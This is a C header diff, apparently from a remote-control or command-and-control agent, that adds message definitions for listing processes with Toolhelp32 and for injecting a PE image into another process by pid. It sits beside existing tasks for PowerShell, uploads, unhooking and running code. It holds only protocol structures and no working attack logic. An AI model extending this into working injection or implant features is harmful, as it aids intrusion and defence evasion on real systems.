@@ -176,6 +176,45 @@ union {
 };
 MSG_TEMPLATE_END(runcode);
 
+/* -- PS_T32: ENUM PROCESSES USING Tlhelp32 FUNTIONS -- */
+
+REQ_TEMPLATE_BEGIN(pst32);
+REQ_TEMPLATE_END(pst32);
+
+struct pst32_res_t { uint32_t proc_count; };
+
+SIMPLE_FIN(pst32);
+SIMPLE_FAK(pst32);
+
+MSG_TEMPLATE_BEGIN(pst32);
+union {
+	struct pst32_req_t req;
+	struct pst32_res_t res;
+	struct pst32_fin_t fin;
+	struct pst32_fak_t fak;
+};
+MSG_TEMPLATE_END(pst32);
+
+/* -- INJECT: INJECT A PE INTO ANOTHER PROCESS -- */
+
+REQ_TEMPLATE_BEGIN(inject);
+	int64_t file_len;
+	uint32_t pid;
+REQ_TEMPLATE_END(inject);
+
+ALLOWED_RES(inject);
+SIMPLE_FIN(inject);
+SIMPLE_FAK(inject);
+
+MSG_TEMPLATE_BEGIN(inject);
+union {
+	struct inject_req_t req;
+	struct inject_res_t res;
+	struct inject_fin_t fin;
+	struct inject_fak_t fak;
+};
+MSG_TEMPLATE_END(inject);
+
 enum wrkr_msg_enum_t {
 	POWERSHELL,
 	UPLOAD,
@@ -184,6 +223,8 @@ enum wrkr_msg_enum_t {
 	UNHOOK_BYON,
 	RUN_CODE,
 	RUN_BIN,
+	PS_T32,
+	INJECT,
 	JOB_QUERY
 };
 
@@ -199,6 +240,8 @@ struct wrkr_msg_t {
 		/*
 			struct runbin_msg_t runbin;
 		*/
+		struct pst32_msg_t pst32;
+		struct inject_msg_t inject;
 	};
 };
 
